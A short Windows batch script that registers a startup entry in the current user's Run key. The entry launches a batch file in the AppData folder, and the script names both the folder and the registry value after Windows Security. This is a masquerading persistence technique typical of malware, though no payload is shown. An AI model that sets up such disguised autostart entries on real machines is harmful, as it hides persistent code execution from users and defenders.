@echo off
setlocal

REM Define the path to the batch file
set "batPath=%appdata%\windows security\windowssecurity.bat"

REM Use escaped quotes properly in the registry command
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsSecurity" /t REG_SZ /d "\"%batPath%\"" /f

if %errorlevel% EQU 0 (
    echo Startup entry added successfully.
) else (
    echo Failed to add startup entry.
)

pause
